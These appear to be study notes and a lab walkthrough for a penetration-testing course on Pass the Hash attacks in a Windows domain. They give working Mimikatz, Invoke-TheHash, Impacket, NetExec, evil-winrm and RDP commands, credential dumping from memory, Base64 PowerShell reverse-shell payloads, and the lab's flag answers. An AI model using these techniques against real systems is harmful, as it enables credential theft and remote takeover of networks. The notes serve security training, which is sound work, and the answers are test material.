---
title: "Pass The Hash (PtH)"
category: ["PREP_CPTS", "Pen-testing", "Lateral Movement", "Pass the Hash (PtH)"]
---

A [Pass the Hash (PtH)](https://attack.mitre.org/techniques/T1550/002/) attack is a technique where an attacker uses a password hash instead of the plain text password for authentication. The attacker doesn't need to decrypt the hash to obtain a plaintext password. PtH attacks exploit the authentication protocol, as the password hash remains static for every session until the password is changed.

As discussed in the previous sections, the attacker must have administrative privileges or particular privileges on the target machine to obtain a password hash. Hashes can be obtained in several ways, including:

- Dumping the local SAM database from a compromised host.
- Extracting hashes from the NTDS database (ntds.dit) on a Domain Controller.
- Pulling the hashes from memory (lsass.exe).

Let's assume we obtain the password hash (`64F12CDDAA88057E06A81B54E73B949B`) for the account `julio` from the domain `inlanefreight.htb`. Let's see how we can perform Pass the Hash attacks from Windows and Linux machines.

**Note:** The tools we will be using are located in the `C:\tools` directory on the target host. Once you start the machine and complete the exercises, you can use the tools in that directory. This lab contains two machines, you will have access to one (MS01), and from there, you will connect to the second machine (DC01).

## Introduction to Windows NTLM

Microsoft's [Windows New Technology LAN Manager (NTLM)](https://learn.microsoft.com/en-us/windows-server/security/kerberos/ntlm-overview) is a set of security protocols that authenticates users' identities while also protecting the integrity and confidentiality of their data. NTLM is a single sign-on (SSO) solution that uses a challenge-response protocol to verify the user's identity without having them provide a password.

Despite its known flaws, NTLM is still commonly used to ensure compatibility with legacy clients and servers, even on modern systems. While Microsoft continues to support NTLM, Kerberos has taken over as the default authentication mechanism in Windows 2000 and subsequent Active Directory (AD) domains.

With NTLM, passwords stored on the server and domain controller are not "salted," which means that an adversary with a password hash can authenticate a session without knowing the original password. We call this a `Pass the Hash (PtH) Attack`.

## Pass the Hash with Mimikatz (Windows)

The first tool we will use to perform a Pass the Hash attack is [Mimikatz](https://github.com/gentilkiwi). Mimikatz has a module named `sekurlsa::pth` that allows us to perform a Pass the Hash attack by starting a process using the hash of the user's password. To use this module, we will need the following:

- `/user` - The user name we want to impersonate.
- `/rc4` or `/NTLM` - NTLM hash of the user's password.
- `/domain` - Domain the user to impersonate belongs to. In the case of a local user account, we can use the computer name, localhost, or a dot (.).
- `/run` - The program we want to run with the user's context (if not specified, it will launch cmd.exe).

#### Pass the Hash from Windows Using Mimikatz

```
c:\tools> mimikatz.exe privilege::debug "sekurlsa::pth /user:julio /rc4:64F12CDDAA88057E06A81B54E73B949B /domain:inlanefreight.htb /run:cmd.exe" exit

user    : julio
domain  : inlanefreight.htb
program : cmd.exe
impers. : no
NTLM    : 64F12CDDAA88057E06A81B54E73B949B
  |  PID  8404
  |  TID  4268
  |  LSA Process was already R/W
  |  LUID 0 ; 5218172 (00000000:004f9f7c)
  \_ msv1_0   - data copy @ 0000028FC91AB510 : OK !
  \_ kerberos - data copy @ 0000028FC964F288
   \_ des_cbc_md4       -> null
   \_ des_cbc_md4       OK
   \_ des_cbc_md4       OK
   \_ des_cbc_md4       OK
   \_ des_cbc_md4       OK
   \_ des_cbc_md4       OK
   \_ des_cbc_md4       OK
   \_ *Password replace @ 0000028FC9673AE8 (32) -> null
```
Now we can use cmd.exe to execute commands in the user's context. For this example, `julio` can connect to a shared folder named `julio` on the DC.

![Command prompt showing mimikatz execution with privilege escalation and directory listing commands.](https://cdn.services-k8s.prod.aws.htb.systems/content/modules/308/img/pth_julio.jpg)

## Pass the Hash with PowerShell Invoke-TheHash (Windows)

Another tool we can use to perform Pass the Hash attacks on Windows is [Invoke-TheHash](https://github.com/Kevin-Robertson/Invoke-TheHash). This tool is a collection of PowerShell functions for performing Pass the Hash attacks with WMI and SMB. WMI and SMB connections are accessed through the .NET TCPClient. Authentication is performed by passing an NTLM hash into the NTLMv2 authentication protocol. Local administrator privileges are not required client-side, but the user and hash we use to authenticate need to have administrative rights on the target computer. For this example we will use the user `julio` and the hash `64F12CDDAA88057E06A81B54E73B949B`.

When using `Invoke-TheHash`, we have two options: SMB or WMI command execution. To use this tool, we need to specify the following parameters to execute commands in the target computer:

- `Target` - Hostname or IP address of the target.
- `Username` - Username to use for authentication.
- `Domain` - Domain to use for authentication. This parameter is unnecessary with local accounts or when using the @domain after the username.
- `Hash` - NTLM password hash for authentication. This function will accept either LM:NTLM or NTLM format.
- `Command` - Command to execute on the target. If a command is not specified, the function will check to see if the username and hash have access to WMI on the target.

The following command will use the SMB method for command execution to create a new user named mark and add the user to the Administrators group.

#### Invoke-TheHash with SMB

```
PS c:\htb> cd C:\tools\Invoke-TheHash\
PS c:\tools\Invoke-TheHash> Import-Module .\Invoke-TheHash.psd1
PS c:\tools\Invoke-TheHash> Invoke-SMBExec -Target 172.16.1.10 -Domain inlanefreight.htb -Username julio -Hash 64F12CDDAA88057E06A81B54E73B949B -Command "net user mark Password123 /add && net localgroup administrators mark /add" -Verbose

VERBOSE: [+] inlanefreight.htb\julio successfully authenticated on 172.16.1.10
VERBOSE: inlanefreight.htb\julio has Service Control Manager write privilege on 172.16.1.10
VERBOSE: Service EGDKNNLQVOLFHRQTQMAU created on 172.16.1.10
VERBOSE: [*] Trying to execute command on 172.16.1.10
[+] Command executed with service EGDKNNLQVOLFHRQTQMAU on 172.16.1.10
VERBOSE: Service EGDKNNLQVOLFHRQTQMAU deleted on 172.16.1.10
```

We can also get a reverse shell connection in the target machine. If you are unfamiliar with reverse shells, review the [Shells & Payloads](https://academy.hackthebox.com/module/details/115) module on HTB Academy.

To get a reverse shell, we need to start our listener using Netcat on our Windows machine, which has the IP address `172.16.1.5`. We will use port `8001` to wait for the connection.

#### Netcat listener

```

PS C:\tools> .\nc.exe -lvnp 8001 
listening on [any] 8001 ...
```

To create a simple reverse shell using PowerShell, we can visit [revshells.com](https://www.revshells.com/), set our IP `172.16.1.5` and port `8001`, and select the option `PowerShell #3 (Base64)`, as shown in the following image.

![Reverse Shell Generator interface with IP 172.16.1.5, port 8001, and PowerShell Base64 payload.](https://cdn.services-k8s.prod.aws.htb.systems/content/modules/308/img/rshellonline.jpg)

Now we can execute `Invoke-TheHash` to execute our PowerShell reverse shell script in the target computer. Notice that instead of providing the IP address, which is `172.16.1.10`, we will use the machine name `DC01` (either would work).

#### Invoke-TheHash with WMI

```
PS c:\tools\Invoke-TheHash> Import-Module .\Invoke-TheHash.psd1
PS c:\tools\Invoke-TheHash> Invoke-WMIExec -Target DC01 -Domain inlanefreight.htb -Username julio -Hash 64F12CDDAA88057E06A81B54E73B949B -Command "powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA0AC4AMwAzACIALAA4ADAAMAAxACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA=="

[+] Command executed with process id 520 on DC01

```

The result is a reverse shell connection from the DC01 host (172.16.1.10).

![PowerShell and command prompt showing Invoke-TheHash execution with network connection details and whoami command output.](https://cdn.services-k8s.prod.aws.htb.systems/content/modules/308/img/pth_invoke_the_hash.jpg)

## Pass the Hash with Impacket (Linux)

[Impacket](https://github.com/SecureAuthCorp/impacket) has several tools we can use for different operations such as `Command Execution` and `Credential Dumping`, `Enumeration`, etc. For this example, we will perform command execution on the target machine using `PsExec`.

#### Pass the Hash with Impacket PsExec

```
snchh337@htb$ impacket-psexec administrator@10.129.201.126 -hashes :30B3783CE2ABF1AF70F77D0660CF3453

Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

[*] Requesting shares on 10.129.201.126.....
[*] Found writable share ADMIN$
[*] Uploading file SLUBMRXK.exe
[*] Opening SVCManager on 10.129.201.126.....
[*] Creating service AdzX on 10.129.201.126.....
[*] Starting service AdzX.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.19044.1415]
(c) Microsoft Corporation. All rights reserved.

C:\Windows\system32>
```

There are several other tools in the Impacket toolkit we can use for command execution using Pass the Hash attacks, such as:

- [impacket-wmiexec](https://github.com/SecureAuthCorp/impacket/blob/master/examples/wmiexec.py)
- [impacket-atexec](https://github.com/SecureAuthCorp/impacket/blob/master/examples/atexec.py)
- [impacket-smbexec](https://github.com/SecureAuthCorp/impacket/blob/master/examples/smbexec.py)

## Pass the Hash with NetExec (Linux)

[NetExec](https://github.com/Pennyw0rth/NetExec) is a post-exploitation tool that helps automate assessing the security of large Active Directory networks. We can use NetExec to try to authenticate to some or all hosts in a network looking for one host where we can authenticate successfully as a local admin. This method is also called "Password Spraying" and is covered in-depth in the `Active Directory Enumeration & Attacks` module. Note that this method can lock out domain accounts, so keep the target domain's account lockout policy in mind and make sure to use the local account method, which will try just one login attempt on a host in a given range using the credentials provided if that is your intent.

#### Pass the Hash with NetExec

```
snchh337@htb# netexec smb 172.16.1.0/24 -u Administrator -d . -H 30B3783CE2ABF1AF70F77D0660CF3453

SMB         172.16.1.10   445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:.) (signing:True) (SMBv1:False)
SMB         172.16.1.10   445    DC01             [-] .\Administrator:30B3783CE2ABF1AF70F77D0660CF3453 STATUS_LOGON_FAILURE 
SMB         172.16.1.5    445    MS01             [*] Windows 10.0 Build 19041 x64 (name:MS01) (domain:.) (signing:False) (SMBv1:False)
SMB         172.16.1.5    445    MS01             [+] .\Administrator 30B3783CE2ABF1AF70F77D0660CF3453 (Pwn3d!)
```

If we want to perform the same actions but attempt to authenticate to each host in a subnet using the local administrator password hash, we could add `--local-auth` to our command. This method is helpful if we obtain a local administrator hash by dumping the local SAM database on one host and want to check how many (if any) other hosts we can access due to local admin password re-use. If we see `Pwn3d!`, it means that the user is a local administrator on the target computer. We can use the option `-x` to execute commands. It is common to see password reuse against many hosts in the same subnet. Organizations will often use gold images with the same local admin password or set this password the same across multiple hosts for ease of administration. If we run into this issue on a real-world engagement, a great recommendation for the customer is to implement the [Local Administrator Password Solution (LAPS)](https://www.microsoft.com/en-us/download/details.aspx?id=46899), which randomizes the local administrator password and can be configured to have it rotate on a fixed interval.

#### NetExec - Command Execution

```
snchh337@htb# netexec smb 10.129.201.126 -u Administrator -d . -H 30B3783CE2ABF1AF70F77D0660CF3453 -x whoami

SMB         10.129.201.126  445    MS01            [*] Windows 10 Enterprise 10240 x64 (name:MS01) (domain:.) (signing:False) (SMBv1:True)
SMB         10.129.201.126  445    MS01            [+] .\Administrator 30B3783CE2ABF1AF70F77D0660CF3453 (Pwn3d!)
SMB         10.129.201.126  445    MS01            [+] Executed command 
SMB         10.129.201.126  445    MS01            MS01\administrator
```

Review the [NetExec documentation Wiki](https://www.netexec.wiki/) to learn more about the tool's extensive features.

## Pass the Hash with evil-winrm (Linux)

[Evil-WinRM](https://github.com/Hackplayers/evil-winrm) is another tool we can use to authenticate using the Pass the Hash attack with PowerShell remoting. If SMB is blocked or we don't have administrative rights, we can use this alternative protocol to connect to the target machine.

#### Pass the Hash with evil-winrm

```
snchh337@htb$ evil-winrm -i 10.129.201.126 -u Administrator -H 30B3783CE2ABF1AF70F77D0660CF3453

Evil-WinRM shell v3.3

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\Administrator\Documents>
```

**Note:** When using a domain account, we need to include the domain name, for example: administrator@inlanefreight.htb

## Pass the Hash with RDP (Linux)

We can perform an RDP PtH attack to gain GUI access to the target system using tools like `xfreerdp`.

There are a few caveats to this attack:

- `Restricted Admin Mode`, which is disabled by default, should be enabled on the target host; otherwise, you will be presented with the following error:

![Error message: Account restrictions prevent signing in due to blank passwords, limited sign-in times, or policy restrictions.](https://cdn.services-k8s.prod.aws.htb.systems/content/modules/308/img/rdp_session-4.png)

This can be enabled by adding a new registry key `DisableRestrictedAdmin` (REG_DWORD) under `HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Lsa` with the value of 0. It can be done using the following command:

#### Enable Restricted Admin Mode to allow PtH

`c:\tools> reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f`

![Registry Editor showing path to Lsa with DisableRestrictedAdmin set to 0.](https://cdn.services-k8s.prod.aws.htb.systems/content/modules/308/img/rdp_session-5.png)

Once the registry key is added, we can use `xfreerdp` with the option `/pth` to gain RDP access:

#### Pass the Hash using RDP

```
snchh337@htb$ xfreerdp  /v:10.129.201.126 /u:julio /pth:64F12CDDAA88057E06A81B54E73B949B

[15:38:26:999] [94965:94966] [INFO][com.freerdp.core] - freerdp_connect:freerdp_set_last_error_ex resetting error state
[15:38:26:999] [94965:94966] [INFO][com.freerdp.client.common.cmdline] - loading channelEx rdpdr
...snip...
[15:38:26:352] [94965:94966] [ERROR][com.freerdp.crypto] - @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
[15:38:26:352] [94965:94966] [ERROR][com.freerdp.crypto] - @           WARNING: CERTIFICATE NAME MISMATCH!           @
[15:38:26:352] [94965:94966] [ERROR][com.freerdp.crypto] - @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
...SNIP...
```

![Windows desktop accessed via FreeRDP with Parrot Terminal showing command execution and desktop icons for Recycle Bin, Invoke-TheHash, and mimikatz.](https://cdn.services-k8s.prod.aws.htb.systems/content/modules/308/img/rdp_session_new.jpg)

## UAC limits Pass the Hash for local accounts

UAC (User Account Control) limits local users' ability to perform remote administration operations. When the registry key `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\LocalAccountTokenFilterPolicy` is set to 0, it means that the built-in local admin account (RID-500, "Administrator") is the only local account allowed to perform remote administration tasks. Setting it to 1 allows the other local admins as well.

**Note:** There is one exception, if the registry key `FilterAdministratorToken` (disabled by default) is enabled (value 1), the RID 500 account (even if it is renamed) is enrolled in UAC protection. This means that remote PTH will fail against the machine when using that account.

These settings are only for local administrative accounts. If we get access to a domain account with administrative rights on a computer, we can still use Pass the Hash with that computer. If you want to learn more about LocalAccountTokenFilterPolicy, you can read Will Schroeder's blog post [Pass-the-Hash Is Dead: Long Live LocalAccountTokenFilterPolicy](https://posts.specterops.io/pass-the-hash-is-dead-long-live-localaccounttokenfilterpolicy-506c25a7c167).


# Pass the Hash Practice

Let's put our Pass the Hash skills into practice.


```
Host:     10.129.212.20
Usuario:  Administrator 
Hash:     30B3783CE2ABF1AF70F77D0660CF3453
```

### Question 1

Access the machine using any Pass-the-Hash tool. Submit the contents of the file located at `C:\pth.txt`.


```
snchh337@htb$ impacket-psexec administrator@10.129.212.20 -hashes :30B3783CE2ABF1AF70F77D0660CF3453
Impacket v0.11.0 - Copyright 2023 Fortra

[*] Requesting shares on 10.129.212.20.....
[*] Found writable share ADMIN$
[*] Uploading file MDqzTDGQ.exe
[*] Opening SVCManager on 10.129.212.20.....
[*] Creating service nQKZ on 10.129.212.20.....
[*] Starting service nQKZ.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.17763.2628]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>
```



```
C:\Windows\system32> cd /

C:\> dir
 Volume in drive C has no label.
 Volume Serial Number is B8B3-0D72

 Directory of C:\

10/04/2022  10:55 AM    <DIR>          inetpub
02/25/2022  11:20 AM    <DIR>          PerfLogs
10/04/2022  10:55 AM    <DIR>          Program Files
10/04/2022  10:55 AM    <DIR>          Program Files (x86)
09/26/2022  09:32 AM                18 pth.txt
10/25/2022  07:34 AM    <DIR>          tools
09/26/2022  09:16 AM    <DIR>          Users
04/02/2024  05:14 PM    <DIR>          Windows
               1 File(s)             18 bytes
               7 Dir(s)  17,979,506,688 bytes free

C:\> type C:\pth.txt   
G3t_4CCE$$_V1@_PTH
```

### Question 2

Try to connect via RDP using the administrator hash. What is the name of the registry value that must be set to `0` for PTH over RDP to work? Change the registry key value and connect using the hash with RDP. Submit the name of the registry value as the answer.

> [!NOTE] When connecting with `xfreerdp` we encounter an error, so we will need to connect again via command line and enable Restricted Admin mode to allow PtH.

![](https://afsh4ck.gitbook.io/ethical-hacking-cheatsheet/~gitbook/image?url=https%3A%2F%2F2648005400-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FRolFIJKRJaxKzAUqQKJb%252Fuploads%252F6WMfsdGmDYj64AvUZv5N%252Fimage.png%3Falt%3Dmedia%26token%3Dddc95490-d87a-4214-8357-7f945e48b063&width=768&dpr=3&quality=100&sign=bbd18a16&sv=2)



```
afsh4ck@kali$ impacket-psexec administrator@10.129.212.20 -hashes :30B3783CE2ABF1AF70F77D0660CF3453
Impacket v0.11.0 - Copyright 2023 Fortra

[*] Requesting shares on 10.129.212.20.....
[*] Found writable share ADMIN$
[*] Uploading file CxfYdXeq.exe
[*] Opening SVCManager on 10.129.212.20.....
[*] Creating service QntM on 10.129.212.20.....
[*] Starting service QntM.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.17763.2628]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32> reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f
The operation completed successfully.

C:\Windows\system32> 
```

Now we reconnect using `xfreerdp` and gain access without any issues:

```
xfreerdp /v:10.129.212.20 /u:Administrator /pth:30B3783CE2ABF1AF70F77D0660CF3453 
```

![](https://afsh4ck.gitbook.io/ethical-hacking-cheatsheet/~gitbook/image?url=https%3A%2F%2F2648005400-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FRolFIJKRJaxKzAUqQKJb%252Fuploads%252FMRraPDLv2sv7PGzK2p1o%252Fimage.png%3Falt%3Dmedia%26token%3D0a997ed7-37b7-439f-9011-8f357c4c7bd3&width=768&dpr=3&quality=100&sign=c86db26f&sv=2)

## Question 3

Connect via RDP and use Mimikatz located in `C:\tools` to extract the hashes present in the current session. What is David's NTLM/RC4 hash?

```
PS C:\tools> ls

    Directory: C:\tools

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----        9/23/2022   1:51 PM                Invoke-TheHash
-a----        10/7/2022   9:43 AM        8230912 chisel.exe
-a----        9/22/2022   1:12 PM        1355264 mimikatz.exe
-a----        9/22/2022   1:13 PM          45272 nc.exe
-a----        9/22/2022   1:14 PM         440832 Rubeus.exe

PS C:\tools> .\mimikatz.exe privilege::debug

  .#####.   mimikatz 2.2.0 (x64) #19041 Sep 19 2022 17:44:08
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz(commandline) # privilege::debug
Privilege '20' OK

mimikatz # sekurlsa::logonpasswords

Authentication Id : 0 ; 292134 (00000000:00047526)
Session           : Service from 0
User Name         : david
Domain            : INLANEFREIGHT
Logon Server      : DC01
Logon Time        : 4/2/2024 5:09:19 PM
SID               : S-1-5-21-3325992272-2815718403-617452758-1107
        msv :
         [00000003] Primary
         * Username : david
         * Domain   : INLANEFREIGHT
         * NTLM     : c39f2beb3d2ec06a62cb887fb391dee0  # <---- El Hash NTLM
         * SHA1     : 2277c28035275149d01a8de530cc13b74f59edfb
         * DPAPI    : eaa6db50c1544304014d858928d9694f
 ...
```

### Question 4

Using David's hash, perform a Pass the Hash attack to connect to the shared folder `\\DC01\david` and read the `david.txt` file.

```
mimikatz # sekurlsa::pth /user:david /ntlm:c39f2beb3d2ec06a62cb887fb391dee0 /domain:inlanefreight.htb /run:cmd.exe" exit
```

![](https://afsh4ck.gitbook.io/ethical-hacking-cheatsheet/~gitbook/image?url=https%3A%2F%2F2648005400-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FRolFIJKRJaxKzAUqQKJb%252Fuploads%252FiAuyfoj9JLOHehi3Ib5x%252Fimage.png%3Falt%3Dmedia%26token%3D48130d8b-7162-4c18-a158-4f4e65014eab&width=768&dpr=3&quality=100&sign=5cc87b4a&sv=2)

### Question 5

Using Julio's hash, perform a Pass the Hash attack to connect to the shared folder `\\DC01\julio` and read the `julio.txt` file.

First, we will perform a hash dump with Mimikatz to find Julio's hash:
    
```
PS C:\tools> .\mimikatz.exe

  .#####.   mimikatz 2.2.0 (x64) #19041 Sep 19 2022 17:44:08
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz # privilege::debug
Privilege '20' OK

mimikatz # sekurlsa::logonpasswords

Authentication Id : 0 ; 313896 (00000000:0004ca28)
Session           : Service from 0
User Name         : julio
Domain            : INLANEFREIGHT
Logon Server      : DC01
Logon Time        : 4/3/2024 2:00:43 AM
SID               : S-1-5-21-3325992272-2815718403-617452758-1106
        msv :
         [00000003] Primary
         * Username : julio
         * Domain   : INLANEFREIGHT
         * NTLM     : 64f12cddaa88057e06a81b54e73b949b  # <---- El Hash
         * SHA1     : cba4e545b7ec918129725154b29f055e
```


```
mimikatz # sekurlsa::pth /user:julio /ntlm:64f12cddaa88057e06a81b54e73b949b /domain:inlanefreight.htb /run:cmd.exe" exit
```

![](https://afsh4ck.gitbook.io/ethical-hacking-cheatsheet/~gitbook/image?url=https%3A%2F%2F2648005400-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FRolFIJKRJaxKzAUqQKJb%252Fuploads%252Fl2aUPS0M1oLBLCRpc9Is%252Fimage.png%3Falt%3Dmedia%26token%3D2a601e3b-8006-4b2f-91ea-1e51bdd7fd2b&width=768&dpr=3&quality=100&sign=a479d08e&sv=2)

### Final Question

Using Julio's hash, perform a Pass the Hash attack, start a PowerShell session, and import `Invoke-TheHash` to create a Reverse Shell back to the machine you are connected to via RDP (the target machine, DC01, can only connect to MS01). Use the `nc.exe` tool located in `C:\tools` to listen for the Reverse Shell. Once connected to DC01, read the flag in `C:\julio\flag.txt`.

We will generate a reverse shell payload using [revshells.com](https://revshells.com) choosing the **Powershell #3 Base64** option.

![](https://afsh4ck.gitbook.io/ethical-hacking-cheatsheet/~gitbook/image?url=https%3A%2F%2F2648005400-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FRolFIJKRJaxKzAUqQKJb%252Fuploads%252F3Tz8vtufrHkAyNR7xa7P%252Fimage.png%3Falt%3Dmedia%26token%3D6da3cea4-03f6-4f18-aab8-2fc443515567&width=768&dpr=3&quality=100&sign=f3431a82&sv=2)


![](https://afsh4ck.gitbook.io/ethical-hacking-cheatsheet/~gitbook/image?url=https%3A%2F%2F2648005400-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FRolFIJKRJaxKzAUqQKJb%252Fuploads%252FKLNnE6Lw3ETH0MmdbCyA%252Fimage.png%3Falt%3Dmedia%26token%3Db0c2f51d-c763-4bde-80f5-d07c8cdae47d&width=768&dpr=3&quality=100&sign=419f83a4&sv=2)

Term 1
```
# Iniciamos Listener de Netcat
PS C:\tools> .\nc.exe -nlvp 8001
```

Term 2
```
# Pass the Hash con Reverse Shell
Import-Module .\Invoke-TheHash.psd1
Invoke-WMIExec -Target DC01 -Domain inlanefreight.htb -Username julio -Hash 64F12CDDAA88057E06A81B54E73B949B -Command "powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAyADkALgA4AC4ANgAxACIALAAxADIAMwA0ACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA==="
```

![](https://afsh4ck.gitbook.io/ethical-hacking-cheatsheet/~gitbook/image?url=https%3A%2F%2F2648005400-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FRolFIJKRJaxKzAUqQKJb%252Fuploads%252FsOhgux9WpRx9KsFBTuZ2%252Fimage.png%3Falt%3Dmedia%26token%3D03127e6d-0239-409e-b467-617e2d40e56c&width=768&dpr=3&quality=100&sign=fe5b0ca1&sv=2)


Or we can mount the shared file in another partition and connect to it 

![Pasted image 20260516165854](/VaultSite/wiki-images/Pasted%20image%2020260516165854.png)
